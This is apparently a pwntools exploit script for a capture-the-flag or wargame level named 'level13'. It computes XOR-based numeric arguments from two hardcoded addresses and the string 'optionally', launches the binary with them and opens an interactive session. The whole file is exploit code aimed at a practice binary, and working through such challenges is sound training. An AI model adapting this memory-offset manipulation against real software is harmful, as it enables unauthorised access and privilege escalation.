from pwn import * 

num_args = 21

optionally_root = 0x804a10d
man_root = 0x804a044

# this will be our xor result
# func_arg1 ^ func_arg2 = offset
offset = optionally_root - man_root

args = []
cs = "optionally"

for i in range(0, 10):
    
    func_arg1 = ord(cs[i]) * -1
    func_arg2 = (offset + i) ^ func_arg1

    arg1 = func_arg2 + (2 * (i + 1)) - num_args
    arg2 = func_arg1 - (2 * (i + 1)) + num_args

    args.append(str(arg1))
    args.append(str(arg2))



print(args)

p = process(["./level13"] + args)
p.interactive()
